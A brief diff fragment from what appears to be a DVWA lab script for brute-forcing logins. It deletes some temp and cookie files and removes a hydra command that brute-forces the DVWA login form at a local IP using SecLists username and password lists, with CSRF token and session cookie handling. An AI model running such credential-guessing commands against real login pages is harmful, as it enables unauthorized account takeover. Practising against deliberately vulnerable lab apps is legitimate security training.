@@ -33,4 +33,3 @@ rm -f root
 rm -f test
 rm -f try*
 rm -f dvwa.cookie
-hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRF}:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}:C=/404.php"
